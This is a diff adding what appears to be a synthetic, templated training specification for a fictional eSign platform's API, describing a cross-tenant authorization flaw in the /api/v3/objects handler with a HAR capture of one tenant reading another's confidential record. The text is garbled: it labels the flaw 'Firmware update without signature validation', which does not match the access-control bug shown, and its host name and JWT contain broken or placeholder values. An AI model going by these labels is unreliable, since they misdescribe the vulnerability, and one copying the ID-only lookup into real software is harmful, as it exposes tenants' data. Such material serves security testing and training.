@@ -1,0 +1,85 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** SignFlow eSign Platform
+**Document Version:** 1.4.0 (FINAL)
+**Classification:** SENSITIVE
+**Domain:** Document Signing / eSign
+**Architecture:** REST + Webhook + GraphQL
+**Training Example ID:** BOLA-6196
+
+## 1.0 Executive Summary
+SignFlow eSign Platform is a document signing / esign platform with a REST API. Resources are partitioned
+by `tenant_id` and ownership is tracked via `owner_id`. The API uses JWT authentication
+where the token encodes `sub` (user ID) and `tenant_id`.
+
+## 2.0 Architecture
+- **API:** REST (/api/v3/objects endpoints)
+- **Auth:** OAuth2 JWT with `sub` and `tenant_id` claims
+- **Database:** PostgreSQL with logical tenant partitioning
+- **Pattern under test:** 4.5 — Firmware update without signature validation
+
+## 3.0 Database Schema
+```sql
+
+-- Object table
+CREATE TABLE objects (
+    object_id    VARCHAR(50) PRIMARY KEY,
+    owner_id         VARCHAR(50) NOT NULL REFERENCES users(user_id),
+    tenant_id        VARCHAR(50) NOT NULL,
+    status           VARCHAR(20) DEFAULT 'active',
+    sensitive_data   TEXT,
+    created_at       TIMESTAMP DEFAULT NOW()
+);
+CREATE INDEX idx_object_tenant ON objects(tenant_id);
+-- NOTE: Application code does NOT use tenant_id in authorization checks
+
+```
+
+## 4.0 Vulnerability Context
+**Pattern:** 4.5 — Firmware update without signature validation (Integrity)
+
+The `GET/PATCH/DELETE /api/v3/objects/:id` endpoint accepts a `object_id` in the URL path.
+The backend handler queries the database by ID only, without filtering by `owner_id` or `tenant_id`.
+An authenticated user from `ORG-EB10` can access objects owned by `ORG-101C`.
+
+_Specific exploitation for Pattern 4.5:_ The `/api/v3/objects` handler does not enforce tenant/owner boundaries for Pattern 4.5.
+
+## 5.0 Artifact (HAR)
+```json
+{
+  "log": {
+    "version": "1.2",
+    "entries": [
+      {
+        "startedDateTime": "2026-04-13T16:30:09.932539+00:00",
+        "time": 223,
+        "request": {
+          "method": "GET",
+          "url": "https://api.signflow-esign-.example.com/api/v3/objects/OBJ-8196",
+          "httpVersion": "HTTP/1.1",
+          "headers": [
+            {"name": "Authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"},
+            {"name": "X-Tenant-ID", "value": "ORG-EB10"},
+            {"name": "Accept", "value": "application/json"}
+          ],
+          "queryString": [],
+          "bodySize": 0
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "content": {
+            "mimeType": "application/json",
+            "text": "{\"id\":\"OBJ-8196\",\"tenantId\":\"ORG-101C\",\"ownerId\":\"other-user-eb10101c\",\"sensitiveData\":\"CONFIDENTIAL: cross-tenant data for ORG-101C\"}"
+          },
+          "bodySize": 104
+        }
+      }
+    ]
+  }
+}
+```
+
+## 6.0 Known Risk Log
+- **RISK-45-6196:** Pattern 4.5 detected in `/api/v3/objects` handler.
+  The handler was written before the tenant isolation policy was established.
+  Remediation is blocked pending DB migration ticket #DB-6296.
